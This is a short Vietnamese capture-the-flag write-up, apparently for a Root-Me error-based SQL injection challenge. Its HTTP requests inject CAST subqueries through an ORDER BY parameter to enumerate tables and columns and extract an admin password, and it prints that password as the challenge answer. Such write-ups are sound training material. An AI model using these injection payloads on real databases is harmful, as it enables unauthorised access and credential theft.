## 61. SQL injection - Error
- Đầu tiên phát hiện lỗi sql ở trang content vì dựa vào tham số order nên có thể đoán được hàm dùng là order by ...
- Ở đây dùng hàm Cast() để ép kiểu truyền vào là số nguyên phù hợp với order by.
- Tìm tên bảng vì có nhiều bảng nên limit 1 vào.
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select table_name from information_schema.tables limit 1) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "m3mbr35t4bl3"
```
- Vì chỉ có thể hiện được một kết quả nên dùng offset (Chức năng là lấy dữ liệu bỏ qua offset đầu)
- Vì có nhiều cột nên thay đổi offset từ 1->... nhưng chỉ cần quan tâm 2 cột đầu là username và password.
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select column_name from information_schema.columns limit 1 offset 1) as int)-- - HTTP/1.1

C1: us3rn4m3_c0l
C2: p455w0rd_c0l
C3: em41l_c0l
.......
```
- Lấy username và password thôi
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select us3rn4m3_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "admin"

GET /web-serveur/ch34/?action=contents&order=,CAST((select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "1a2BdKT5DIx3qxQN3UaC"
```
```js
Password: 1a2BdKT5DIx3qxQN3UaC
```
